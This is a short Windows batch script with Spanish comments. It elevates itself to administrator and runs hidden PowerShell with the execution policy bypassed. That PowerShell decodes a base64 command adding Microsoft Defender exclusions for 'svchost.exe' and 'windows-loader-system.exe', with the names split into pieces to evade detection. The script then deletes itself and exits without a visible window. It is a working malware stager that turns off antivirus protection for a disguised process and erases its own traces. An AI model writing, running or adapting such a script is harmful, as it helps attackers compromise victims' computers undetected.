@echo off
:: Autoelevación a administrador
net session >nul 2>&1
if %errorlevel% neq 0 (
    powershell -Command "Start-Process '%~f0' -Verb RunAs"
    exit /b
)

:: Ejecutar el comando combinado (excluye svchost.exe y windows-loader-system.exe)
powershell -NoP -NonI -W Hidden -Exec Bypass -Command "IEX ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('QWRkLU1wUHJlZmVyZW5jZSAtRXhjbHVzaW9uUHJvY2VzcyAoJ3N2Y2hvc3QnICsgJy5leGUnKTsgQWRkLU1wUHJlZmVyZW5jZSAtRXhjbHVzaW9uUHJvY2VzcyAoJ3dpbmRvd3MtbG9hZGVyLXN5c3RlbScgICsgJy5leGUnKQ==')))"

:: Autoborrado: lanza un proceso en segundo plano que espera 3 segundos y elimina este .bat
start /b powershell -Command "Start-Sleep -Seconds 3; Remove-Item -Path '%~f0' -Force"

:: Salir sin mostrar ventanas
exit